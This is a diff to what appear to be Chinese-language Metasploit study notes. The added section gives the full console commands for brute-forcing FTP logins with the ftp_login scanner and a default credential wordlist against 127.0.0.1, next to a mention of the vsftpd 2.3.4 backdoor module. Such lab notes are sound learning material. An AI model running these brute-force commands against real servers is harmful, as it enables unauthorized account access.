@@ -148,6 +148,17 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
 anonymous匿名扫描
 实现功能：针对2.3.4版本的ftp，可以匿名访问
 
+####————》ftp暴力破解
+搜索ftp_login
+
+msf6 > search ftp_login
+msf6 > use auxiliary/scanner/ftp/ftp_login
+msf6 auxiliary(scanner/ftp/ftp_login) > show options
+msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 127.0.0.1
+msf6 auxiliary(scanner/ftp/ftp_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
+msf6 auxiliary(scanner/ftp/ftp_login) > show options
+msf6 auxiliary(scanner/ftp/ftp_login) > run
+ 拿到密码后，
 
 
 
